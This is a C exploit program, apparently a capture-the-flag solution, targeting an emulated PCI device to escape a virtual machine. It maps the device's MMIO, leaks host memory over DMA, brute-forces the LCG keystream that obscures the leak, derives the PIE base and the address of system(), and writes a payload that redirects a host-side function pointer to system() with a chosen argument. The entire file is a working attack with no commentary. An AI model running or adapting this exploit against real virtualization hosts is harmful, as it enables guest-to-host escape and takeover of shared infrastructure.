#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

#define BAR "/sys/bus/pci/devices/0000:00:04.0"
#define PCI_SIZE 0x10000

#define MMIO_READ_OP 0x0
#define MMIO_LEN     0x8
#define MMIO_SRC     0xC

#define LCG_A 1103515245u
#define LCG_C 12345u
#define LCG_M 0x7FFFFFFFu

#define INPUT_MASK 0xFF

#define RUN_LEN     0x80          
#define DECRYPT_LEN 0x100    

#define SAMPLES_PER_LANE 8
#define CRACK_LEN (4 * SAMPLES_PER_LANE)

static int pagemap_fd = -1;

static uint64_t virt2phys(void *p) {
    uint64_t v = (uint64_t)p;
    uint64_t page = v & ~0xfffull;
    uint64_t off  = v &  0xfffull;

    if (pagemap_fd == -1) {
        pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
        assert(pagemap_fd != -1);
    }

    uint64_t idx = (page / 0x1000ull) * 8ull;
    lseek(pagemap_fd, idx, SEEK_SET);

    uint64_t e;
    read(pagemap_fd, &e, 8);
    assert(e & (1ull << 63));

    return ((e & ((1ull << 55) - 1)) * 0x1000ull) + off;
}

static inline void mmio_w32(volatile void *mmio, uint64_t o, uint32_t v) {
    *(volatile uint32_t *)((uintptr_t)mmio + o) = v;
}
static inline uint32_t mmio_r32(volatile void *mmio, uint64_t o) {
    return *(volatile uint32_t *)((uintptr_t)mmio + o);
}

static inline uint32_t lcg_next(uint32_t s) {
    return (uint32_t)((1ull * LCG_A * s + LCG_C) % LCG_M);
}

static uint32_t crack_lane(const uint8_t *raw) {
    uint8_t ks0 = raw[0] ^ INPUT_MASK;

    for (uint32_t hi = 0; hi < (1u << 23); hi++) {
        uint32_t s = (hi << 8) | ks0;
        uint32_t c = s;

        int ok = 1;
        for (int i = 1; i < SAMPLES_PER_LANE; i++) {
            s = lcg_next(s);
            if ((s & 0xFF) != (raw[i] ^ INPUT_MASK)) {
                ok = 0;
                break;
            }
        }
        if (ok) return c;
    }
    return 0;
}


void dump_buffer(void *buf, int len) {
    printf("\n[i] Dumping %d bytes.\n\n", len);
    for (int i = 0; i < len; i += 0x10){
        printf("ADDR[%d, 0x%x]:\t%016lx: 0x", i / 0x08, i, (unsigned long)(buf + i));
        for (int j = 7; j >= 0; j--) printf("%02x", *(unsigned char *)(buf + i + j));
        printf(" - 0x");
        for (int j = 7; j >= 0; j--) printf("%02x", *(unsigned char *)(buf + i + j + 8));
        puts("");
    }
}

int main(void) {
    setbuf(stdout, NULL);

    // enable bus mastering
    int cfg = open(BAR "/config", O_RDWR);
    uint16_t cmd;
    pread(cfg, &cmd, 2, 0x04);
    cmd |= 0x4;
    pwrite(cfg, &cmd, 2, 0x04);
    close(cfg);

    int fd = open(BAR "/resource0", O_RDWR | O_SYNC);
    volatile void *mmio = mmap(NULL, PCI_SIZE, PROT_READ | PROT_WRITE,
                               MAP_SHARED, fd, 0);

    uint8_t *dma = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

    memset(dma, INPUT_MASK, 0x2000);
    uint64_t phys = virt2phys(dma);

    printf("[+] DMA virt=%p phys=0x%lx\n", dma, phys);

    mmio_w32(mmio, MMIO_SRC, (uint32_t)phys);
    mmio_w32(mmio, MMIO_LEN, RUN_LEN);

    mmio_r32(mmio, MMIO_READ_OP);
    mmio_w32(mmio, MMIO_READ_OP, 0);

    // crack PRNG
    uint32_t state0[4];
    for (int l = 0; l < 4; l++) {
        uint8_t lane[SAMPLES_PER_LANE];
        for (int i = 0; i < SAMPLES_PER_LANE; i++)
            lane[i] = dma[l + 4*i];

        state0[l] = crack_lane(lane);
        printf("[+] lane[%d] state0 = 0x%08x\n", l, state0[l]);
        assert(state0[l]);
    }

    // verify first 0x20
    uint32_t sim[4] = { state0[0], state0[1], state0[2], state0[3] };
    for (int i = 0; i < CRACK_LEN; i++) {
        int l = i % 4;
        uint8_t exp = (sim[l] & 0xFF) ^ INPUT_MASK;
        assert(exp == dma[i]);
        sim[l] = lcg_next(sim[l]);
    }
    puts("[+] PRNG verified");

    // decrypt 0x100
    puts("\n[+] Decrypting 0x00 ~ 0x100");
    uint32_t cur[4] = { state0[0], state0[1], state0[2], state0[3] };

    char PT[0x100] = {0};

    for (int i = 0; i < DECRYPT_LEN; i++) {
        int l = i % 4;
        uint8_t pt = dma[i] ^ (cur[l] & 0xFF);
        PT[i] = pt;

        if (pt != 0xFF) {
            printf("off=0x%03x raw=%02x pt=%02x",
                   i, dma[i], pt);
            if (pt >= 0x20 && pt <= 0x7e)
                printf(" ('%c')", pt);
            puts("");
        }

        cur[l] = lcg_next(cur[l]);
    }

    dump_buffer(PT, 0x100);

    unsigned long pie = *(unsigned long *)(PT + 0x88) - 0x4a2960;
    printf("[+] PIE = 0x%lx\n", pie);

    unsigned long system = pie + 0x348c80;
    printf("[+] System = 0x%lx\n", system);

    char pay[0x100] = {0};
    *(unsigned long *)(pay + 0x88) = system;
    *(unsigned long *)(pay + 0x78) = 0xffffffffffffffff;
    *(unsigned long *)(pay + 0x90) = 11941134908809571;

    phys = virt2phys(pay);

    printf("[+] DMA virt=%p phys=0x%lx\n", pay, phys);

    mmio_w32(mmio, MMIO_SRC, (uint32_t)phys);
    mmio_r32(mmio, MMIO_READ_OP);

    mmio_w32(mmio, MMIO_READ_OP, 0);

    return 0;
}